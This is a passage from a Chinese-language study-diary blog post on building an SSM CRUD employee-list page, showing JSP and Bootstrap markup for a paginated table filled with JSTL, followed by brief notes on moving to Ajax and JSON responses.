class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--显示表格数据--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>qwe<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>男<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>aaa@qq.com<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                编辑</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                删除</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--显示分页信息--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            分页文字信息<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                当前记录数：XXX</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            分页条信息<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;laquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>1<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;raquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>末页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>这样基本的前端页面框架就出来，接下来就是填充数据就好了<br><img src="/img/JavaWeb/10-12学习日记/0.png" alt="avatar"></p>
<h1 id="实现分页查询"><a href="#实现分页查询" class="headerlink" title="实现分页查询"></a>实现分页查询</h1><p>接下来就是将数据解析填充到对应位置<br>list.jsp<br><figure class="highlight dust"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span></span></span></span><br><span class="line"><span class="xml">    web路径：</span></span><br><span class="line"><span class="xml">        不以/开始的相对路径，找资源，以当前资源的路径为基准，经常容易出现问题</span></span><br><span class="line"><span class="xml">        以/开始的相对路径，找资源，以服务器的路径为标准（http://localhost:3306）需要加上项目名</span></span><br><span class="line"><span class="xml">            http://localhost:3306/crud</span></span><br><span class="line"><span class="xml">--%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">contentType</span>=<span class="string">"text/html;charset=UTF-8"</span> <span class="attr">language</span>=<span class="string">"java"</span> %&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">taglib</span> <span class="attr">uri</span>=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> <span class="attr">prefix</span>=<span class="string">"c"</span>%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>员工列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="xml">        pageContext.setAttribute("APP_PATH",request.getContextPath());</span></span><br><span class="line"><span class="xml">    %&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--标题--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--按钮--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span>新增<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>删除<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--显示表格数据--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>操作<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.list&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"emp"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empId&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.empName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.gender=="M"?"男":"女"&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.email&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span>$</span><span class="template-variable">&#123;emp.department.deptName&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-pencil"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    编辑</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger btn-sm"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"glyphicon glyphicon-trash"</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span> /&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    删除</span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%--显示分页信息--%</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            分页文字信息<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                当前记录数：$</span><span class="template-variable">&#123;pageInfo.pageNum&#125;</span><span class="xml">页，总$</span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml">页,总$</span><span class="template-variable">&#123;pageInfo.total&#125;</span><span class="xml">条记录</span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>            分页条信息<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">nav</span> <span class="attr">aria-label</span>=<span class="string">"Page navigation"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"pagination"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=1"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        有上一页再显示箭头，没有则不显示<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasPreviousPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum-1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Previous"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;laquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        遍历显示页码，当前页码高亮<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:forEach</span> <span class="attr">items</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.navigatepageNums&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">var</span>=<span class="string">"pageNumb"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb == pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageNumb != pageInfo.pageNum&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>$</span><span class="template-variable">&#123;pageNumb&#125;</span><span class="xml"><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:forEach</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%--</span>                        有下一页再显示箭头，没有则不显示<span class="attr">--</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">c:if</span> <span class="attr">test</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;pageInfo.hasNextPage&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pageNum+1&#125;</span><span class="xml"><span class="tag"><span class="string">"</span> <span class="attr">aria-label</span>=<span class="string">"Next"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;raquo;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">c:if</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"$</span></span></span><span class="template-variable">&#123;APP_PATH&#125;</span><span class="xml"><span class="tag"><span class="string">/emps?pn=$</span></span></span><span class="template-variable">&#123;pageInfo.pages&#125;</span><span class="xml"><span class="tag"><span class="string">"</span>&gt;</span>末页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><br>这样就实现了预览图的效果啦</p>
<h1 id="控制器返回JSON数据"><a href="#控制器返回JSON数据" class="headerlink" title="控制器返回JSON数据"></a>控制器返回JSON数据</h1><p>目前我们这样写，只适用于浏览器与服务器，所以还需要考虑移动设备用户，就需要借助JSON</p>
<p>目前最好的解决方案就是服务器端去处理JSON数据，使用Ajax请求来完成</p>
<h2 id="查询-Ajax"><a href="#查询-Ajax" class="headerlink" title="查询-Ajax"></a>查询-Ajax</h2><ol>
<li><p>index.jsp页面直接发送ajax请求进行员工分页数据的查询</p>
</li>
<li><p>服务器将查出的数据，以json字符串的形式返回给浏览器</p>
</li>
<li><p>浏览器收到js字符串。可以使用js对json进行解析，使用js通过dom增删改的形式来改变页面</p>
</li>
<li><p>返回json。实现客户端的无关性</p>
</li>
</ol>
